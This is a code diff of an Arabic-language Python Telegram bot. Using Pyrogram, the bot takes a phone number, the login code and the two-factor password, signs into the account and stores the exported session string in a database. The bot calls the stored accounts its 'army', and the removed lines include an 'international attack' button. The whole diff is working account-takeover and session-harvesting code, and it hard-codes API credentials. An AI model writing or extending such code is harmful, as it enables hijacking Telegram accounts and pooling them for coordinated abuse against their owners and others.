@@ -10,15 +10,14 @@ from threading import Thread
 # --- الإعدادات ---
 BOT_TOKEN = os.getenv("TG_BOT_TOKEN")
 DATABASE_URL = os.getenv("DATABASE_URL")
-# هاشات ثابتة "قناع" عشان ما تعور راسك
 API_ID = 26569722 
 API_HASH = "90a9314c99544976451664d4c1f964fc"
 
-bot = telebot.TeleBot(BOT_TOKEN, threaded=False) # تعطيل الـ Threads لتحسين استجابة الهاندلرز
+bot = telebot.TeleBot(BOT_TOKEN)
 server = Flask(__name__)
 user_data = {}
 
-# --- سيرفر الويب عشان ريندر ---
+# --- سيرفر الويب ---
 @server.route("/")
 def home():
     return "Mikey Center is Alive!", 200
@@ -45,14 +44,13 @@ init_db()
 def send_welcome(message):
     markup = types.InlineKeyboardMarkup()
     markup.add(types.InlineKeyboardButton("➕ إضافة حساب للجيش", callback_data="add_acc"))
-    markup.add(types.InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"), types.InlineKeyboardButton("📜 اللوج", callback_data="log"))
-    markup.add(types.InlineKeyboardButton("☣️ شن الهجوم الدولي", callback_data="attack"))
-    bot.send_message(message.chat.id, "🔥 **مقر مايكي للعمليات الضاربة** 🔥\n\nالجيش جاهز والأوامر بيدك. وش نبي نسوي؟", reply_markup=markup, parse_mode="Markdown")
+    markup.add(types.InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"))
+    bot.send_message(message.chat.id, "🔥 **مقر مايكي للعمليات** 🔥\n\nأرسل /add لإضافة حساب مباشرة أو استخدم الأزرار:", reply_markup=markup, parse_mode="Markdown")
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_query(call):
     if call.data == "add_acc":
-        msg = bot.send_message(call.message.chat.id, "📱 أرسل رقم الهاتف الحين مع المفتاح (مثال: +17539221035):")
+        msg = bot.send_message(call.message.chat.id, "📱 الحين أرسل الرقم (مثال: +17539221035):")
         bot.register_next_step_handler(msg, process_phone_step)
     elif call.data == "stats":
         conn = get_db_connection()
@@ -61,32 +59,33 @@ def handle_query(call):
         count = cur.fetchone()[0]
         cur.close()
         conn.close()
-        bot.answer_callback_query(call.id)
-        bot.send_message(call.message.chat.id, f"📊 **الجيش الحالي:** `{count}` حساب مستعد.")
-    elif call.data == "attack":
-        bot.send_message(call.message.chat.id, "⚠️ **قسم الهجوم قيد التجهيز...** (ننتقل له بالملف الجاي يا وحش).")
+        bot.send_message(call.message.chat.id, f"📊 **الجيش الحالي:** `{count}` حساب.")
 
-# --- معالجة إضافة الحساب ---
+# --- المعالج الرئيسي للرسايل النصية (بدون أوامر) ---
+@bot.message_handler(func=lambda message: True)
+def handle_all_messages(message):
+    # إذا المستخدم أرسل رقم جوال مباشرة بدون ما يضغط زر
+    if message.text.startswith('+'):
+        process_phone_step(message)
+    else:
+        bot.reply_to(message, "تبي تضيف حساب؟ اضغط الزر فوق أو أرسل الرقم يبدأ بـ +")
+
+# --- خطوات إضافة الحساب ---
 def process_phone_step(message):
-    chat_id = message.chat.id
     phone = message.text.strip()
-    if not phone.startswith('+'):
-        msg = bot.send_message(chat_id, "❌ لازم تبدأ الرقم بـ (+) مع مفتاح الدولة. أرسله صح:")
-        bot.register_next_step_handler(msg, process_phone_step)
-        return
-
-    bot.send_message(chat_id, "⏳ جاري محاولة الدخول وسحب الكود...")
+    chat_id = message.chat.id
     
-    # استخدام بايروجام في الذاكرة
-    client = Client(f"session_{chat_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
+    bot.send_message(chat_id, f"⏳ جاري فحص الرقم {phone}...")
+    
+    client = Client(f"temp_{chat_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
     try:
         client.connect()
         code_info = client.send_code(phone)
         user_data[chat_id] = {'phone': phone, 'client': client, 'hash': code_info.phone_code_hash}
-        msg = bot.send_message(chat_id, f"📩 وصلك كود على {phone}؟ أرسله الحين:")
+        msg = bot.send_message(chat_id, "📩 أرسل الكود اللي وصلك:")
         bot.register_next_step_handler(msg, process_code_step)
     except Exception as e:
-        bot.send_message(chat_id, f"❌ خطأ: {str(e)}")
+        bot.send_message(chat_id, f"❌ خطأ: {e}")
 
 def process_code_step(message):
     chat_id = message.chat.id
@@ -94,28 +93,24 @@ def process_code_step(message):
     if chat_id not in user_data: return
 
     data = user_data[chat_id]
-    client = data['client']
-    
     try:
-        client.sign_in(data['phone'], data['hash'], code)
-        save_session(message, client, data['phone'])
+        data['client'].sign_in(data['phone'], data['hash'], code)
+        save_session(message, data['client'], data['phone'])
     except SessionPasswordNeeded:
-        msg = bot.send_message(chat_id, "🔐 الحساب محمي بكلمة سر، أرسلها الحين:")
+        msg = bot.send_message(chat_id, "🔐 أرسل كلمة السر:")
         bot.register_next_step_handler(msg, process_password_step)
     except Exception as e:
-        bot.send_message(chat_id, f"❌ كود غلط أو انتهى: {str(e)}")
+        bot.send_message(chat_id, f"❌ خطأ: {e}")
 
 def process_password_step(message):
     chat_id = message.chat.id
     password = message.text.strip()
     data = user_data.get(chat_id)
-    
     try:
-        client = data['client']
-        client.check_password(password)
-        save_session(message, client, data['phone'])
+        data['client'].check_password(password)
+        save_session(message, data['client'], data['phone'])
     except Exception as e:
-        bot.send_message(chat_id, f"❌ كلمة سر غلط: {str(e)}")
+        bot.send_message(chat_id, f"❌ خطأ بالسر: {e}")
 
 def save_session(message, client, phone):
     string = client.export_session_string()
@@ -125,12 +120,9 @@ def save_session(message, client, phone):
     conn.commit()
     cur.close()
     conn.close()
-    client.disconnect()
-    bot.send_message(message.chat.id, f"✅ كفو! الحساب {phone} صار في الجيب وجاهز للشن.")
+    bot.send_message(message.chat.id, f"✅ الحساب {phone} تم سحقه وضمه للجيش!")
     del user_data[message.chat.id]
 
-# --- التشغيل ---
 if __name__ == "__main__":
     Thread(target=run_web).start()
-    print("🚬 Mikey is Online and Ready!")
-    bot.infinity_polling(skip_pending=True)
+    bot.infinity_polling()
